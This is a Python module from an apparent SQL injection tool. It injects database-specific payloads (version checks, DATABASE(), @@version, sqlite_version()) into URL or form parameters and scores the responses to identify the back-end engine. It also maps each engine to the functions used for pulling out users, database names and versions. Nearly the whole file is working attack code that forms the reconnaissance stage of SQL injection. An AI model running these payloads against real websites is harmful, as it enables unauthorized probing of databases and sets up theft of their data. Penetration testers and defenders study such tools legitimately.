"""
Database Fingerprinting Module
Automatically detect database type (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
"""

from colorama import Fore, Style


class DatabaseFingerprint:
    """Database type detection"""

    # Database-specific fingerprint queries
    FINGERPRINTS = {
        'MySQL': {
            'queries': [
                "' AND SUBSTRING(VERSION(),1,1)='5",
                "' AND SUBSTRING(VERSION(),1,1)='8",
                "' AND 'a'='a' AND CONCAT('a','b')='ab",
                "' AND DATABASE() LIKE '%",
                "' AND @@version LIKE '%",
            ],
            'keywords': ['mysql', 'mariadb', '5.', '8.'],
            'functions': ['VERSION()', 'DATABASE()', 'USER()', 'CONCAT()', 'SUBSTRING()']
        },
        'PostgreSQL': {
            'queries': [
                "' AND 'a'='a' AND version() LIKE '%PostgreSQL%",
                "' AND CAST(version() AS varchar) LIKE '%",
                "' AND current_database() LIKE '%",
                "' AND SUBSTRING(version(),1,10)='PostgreSQL",
            ],
            'keywords': ['postgresql', 'postgres'],
            'functions': ['version()', 'current_database()', 'current_user', 'pg_']
        },
        'MSSQL': {
            'queries': [
                "' AND 'a'='a' AND @@version LIKE '%Microsoft%",
                "' AND LEN('a')=1--",
                "' AND SUBSTRING(@@version,1,10)='Microsoft'--",
                "' AND DB_NAME() LIKE '%",
            ],
            'keywords': ['microsoft', 'sql server', 'mssql'],
            'functions': ['@@version', 'DB_NAME()', 'SYSTEM_USER', 'LEN()', 'SUBSTRING()']
        },
        'Oracle': {
            'queries': [
                "' AND 'a'='a' AND BANNER LIKE '%Oracle%' FROM v$version WHERE ROWNUM=1--",
                "' AND LENGTH('a')=1--",
                "' AND SUBSTR('abc',1,1)='a'--",
            ],
            'keywords': ['oracle', 'plsql'],
            'functions': ['BANNER', 'USER', 'SYSDATE', 'ROWNUM', 'SUBSTR()', 'LENGTH()']
        },
        'SQLite': {
            'queries': [
                "' AND 'a'='a' AND sqlite_version() LIKE '%",
                "' AND LENGTH('a')=1--",
                "' AND SUBSTR('abc',1,1)='a'--",
            ],
            'keywords': ['sqlite', 'sqlite3'],
            'functions': ['sqlite_version()', 'sqlite_', 'SUBSTR()', 'LENGTH()']
        }
    }

    @staticmethod
    def detect_database(http_client, url, param_name, param_value, method='GET'):
        """
        Detect database type
        Returns: (db_type, confidence)
        """
        print(f"{Fore.CYAN}[*] Fingerprinting database...{Style.RESET_ALL}")

        scores = {db: 0 for db in DatabaseFingerprint.FINGERPRINTS.keys()}

        for db_type, fingerprint in DatabaseFingerprint.FINGERPRINTS.items():
            # Test database-specific queries
            for query in fingerprint['queries'][:3]:  # Test only first 3 for speed
                payload = param_value + query

                try:
                    if method == 'GET':
                        test_url = url.replace(f"{param_name}={param_value}",
                                              f"{param_name}={payload}")
                        response = http_client.get(test_url)
                    else:  # POST
                        data = {param_name: payload}
                        response = http_client.post(url, data=data)

                    if response and response.status_code == 200:
                        response_text = response.text.lower()

                        # Check for database-specific keywords in response
                        for keyword in fingerprint['keywords']:
                            if keyword in response_text:
                                scores[db_type] += 3

                        # Check for database-specific function names
                        for func in fingerprint['functions']:
                            if func.lower() in response_text:
                                scores[db_type] += 1

                        # Check if query executed successfully (no error)
                        if len(response_text) > 100 and 'error' not in response_text:
                            scores[db_type] += 1

                except Exception:
                    pass

        # Find database with highest score
        if max(scores.values()) > 0:
            detected_db = max(scores, key=scores.get)
            confidence = min(scores[detected_db] * 10, 95)  # Max 95% confidence

            print(f"{Fore.GREEN}[✓] Database detected: {detected_db} "
                  f"(Confidence: {confidence}%){Style.RESET_ALL}")
            return detected_db, confidence

        print(f"{Fore.YELLOW}[!] Could not determine database type{Style.RESET_ALL}")
        return None, 0

    @staticmethod
    def get_extraction_functions(db_type):
        """Get database-specific functions for data extraction"""
        functions = {
            'MySQL': {
                'user': 'USER()',
                'database': 'DATABASE()',
                'version': 'VERSION()',
                'concat': 'CONCAT',
                'substring': 'SUBSTRING',
                'length': 'LENGTH',
                'ascii': 'ASCII',
                'comment': '-- '
            },
            'PostgreSQL': {
                'user': 'current_user',
                'database': 'current_database()',
                'version': 'version()',
                'concat': '||',
                'substring': 'SUBSTRING',
                'length': 'LENGTH',
                'ascii': 'ASCII',
                'comment': '-- '
            },
            'MSSQL': {
                'user': 'SYSTEM_USER',
                'database': 'DB_NAME()',
                'version': '@@VERSION',
                'concat': '+',
                'substring': 'SUBSTRING',
                'length': 'LEN',
                'ascii': 'ASCII',
                'comment': '-- '
            },
            'Oracle': {
                'user': 'USER',
                'database': 'SYS_CONTEXT(\'USERENV\',\'DB_NAME\')',
                'version': 'BANNER FROM v$version WHERE ROWNUM=1',
                'concat': '||',
                'substring': 'SUBSTR',
                'length': 'LENGTH',
                'ascii': 'ASCII',
                'comment': '-- '
            },
            'SQLite': {
                'user': '\'sqlite_user\'',  # SQLite doesn't have user concept
                'database': '\'main\'',
                'version': 'sqlite_version()',
                'concat': '||',
                'substring': 'SUBSTR',
                'length': 'LENGTH',
                'ascii': 'ASCII',
                'comment': '-- '
            }
        }

        return functions.get(db_type, functions['MySQL'])  # Default to MySQL
